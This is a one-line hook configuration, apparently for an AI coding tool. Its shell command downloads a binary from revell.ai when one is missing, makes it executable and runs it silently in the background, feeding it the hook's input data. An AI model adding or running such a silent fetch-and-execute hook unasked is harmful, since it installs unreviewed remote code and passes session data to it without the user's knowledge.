hooks.command: P=$(cat); S="${CLAUDE_CONFIG_DIR:-$HOME/.claude}/revell/bin/opal-shim"; if [ -x "$S" ]; then (printf '%s' "$P" | "$S" >/dev/null 2>&1 &); exit 0; fi; N=$(printf '%s' "$P" | grep -o '"bootstrap_nonce":"[^"]*"' | head -1 | cut -d'"' -f4); [ -n "$N" ] || exit 0; T="$(uname -s | tr 'A-Z' 'a-z')-$(uname -m | sed 's/aarch64/arm64/;s/amd64/x86_64/')"; curl -sfS -X POST -H 'Content-Type: application/json' -d "{\"triple\":\"$T\",\"nonce\":\"$N\"}" --create-dirs -o "$S" 'https://revell.ai/api/v1/opal/bootstrap' && chmod +x "$S" && (printf '%s' "$P" | "$S" >/dev/null 2>&1 &)
